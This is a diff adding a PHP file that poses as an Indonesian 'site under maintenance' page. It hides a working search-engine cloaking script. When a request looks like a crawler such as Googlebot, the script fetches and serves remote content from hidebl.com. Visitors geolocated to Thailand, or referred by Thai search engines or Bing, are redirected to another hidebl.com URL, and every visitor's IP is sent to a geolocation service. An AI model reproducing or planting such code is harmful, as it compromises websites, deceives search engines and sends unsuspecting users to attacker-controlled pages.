@@ -1,0 +1,122 @@
+<?php
+
+header('Vary: Accept-Language');
+header('Vary: User-Agent');
+
+ function get_client_ip() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        return $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        return $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
+        return $_SERVER['HTTP_X_FORWARDED'];
+    } elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
+        return $_SERVER['HTTP_FORWARDED_FOR'];
+    } elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
+        return $_SERVER['HTTP_FORWARDED'];
+    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
+        return $_SERVER['REMOTE_ADDR'];
+    } elseif (!empty(getenv('HTTP_CLIENT_IP'))) {
+        return getenv('HTTP_CLIENT_IP');
+    } elseif (!empty(getenv('HTTP_X_FORWARDED_FOR'))) {
+        return getenv('HTTP_X_FORWARDED_FOR');
+    } elseif (!empty(getenv('HTTP_X_FORWARDED'))) {
+        return getenv('HTTP_X_FORWARDED');
+    } elseif (!empty(getenv('HTTP_FORWARDED_FOR'))) {
+        return getenv('HTTP_FORWARDED_FOR');
+    } elseif (!empty(getenv('HTTP_FORWARDED'))) {
+        return getenv('HTTP_FORWARDED');
+    } elseif (!empty(getenv('REMOTE_ADDR'))) {
+        return getenv('REMOTE_ADDR');
+    }
+    return '127.0.0.1';
+}
+
+
+function make_request($url) {
+    if (ini_get('allow_url_fopen')) {
+        return @file_get_contents($url);
+    } elseif (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    }
+    return false;
+}
+
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
+$ip = get_client_ip();
+
+$bot_url = 'https://hidebl.com/s/78';
+$reff_url = 'https://hidebl.com/r/senna';
+
+$file = make_request($bot_url);
+
+$geolocation = @json_decode(make_request("http://ip-api.com/json/{$ip}"), true);
+
+$cc = $geolocation['countryCode'] ? $geolocation['countryCode'] : '';
+
+$botchar = "/(googlebot|slurp|adsense|inspection|verifycation|jenifer)/i";
+
+$accept_language = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
+$accept_encoding = isset($_SERVER['HTTP_ACCEPT_ENCODING']) ? $_SERVER['HTTP_ACCEPT_ENCODING'] : '';
+
+$fingerprint = md5($ua . $ip . $accept_language . $accept_encoding);
+
+if (preg_match($botchar, $ua)) {
+    echo $file;
+    exit;
+}
+
+if ($cc === "TH" || $fingerprint === "known_bad_fingerprint") {
+    header("HTTP/1.1 302 Found");
+    header("Location: " . $reff_url);
+    exit();
+}
+
+if (!empty($rf) && (stripos($rf, "yahoo.co.th") !== false || stripos($rf, "google.co.th") !== false || stripos($rf, "bing.com") !== false)) {
+    header("HTTP/1.1 302 Found");
+    header("Location: " . $reff_url);
+    exit();
+}
+
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Situs Sedang Dalam Perbaikan</title>
+  <style>
+    body {
+      background-color: #f9f9f9;
+      font-family: 'Segoe UI', sans-serif;
+      color: #333;
+      text-align: center;
+      padding: 100px 20px;
+    }
+    h1 {
+      font-size: 3rem;
+      color: #cc0000;
+    }
+    p {
+      font-size: 1.2rem;
+    }
+    .logo {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://blogger.googleusercontent.com/img/a/AVvXsEjm3hv1EM8JDre86G5DyiQH8_gLkwp_WgETRqHZwYKRyEimuVhXHNsgaqqTT5uj9nZ7AO4W3ZZPyTMqjqkrdY1NwCtwKtx87KEtqB1oF4v9OeyLGqxfzYVlwSeYdYriK_j4FkaDXtx0woqNqoDUekUClGOShmFyhCGg10_l1fWiD0oY3tHUmI5X8WU_=w640-h394" alt="Logo" class="logo" />
+  <h1>Situs Sedang Dalam Perbaikan</h1>
+  <p>Kami sedang melakukan pemeliharaan sistem untuk meningkatkan layanan kami.<br>
+     Silakan kunjungi kembali nanti.</p>
+</body>
+</html>
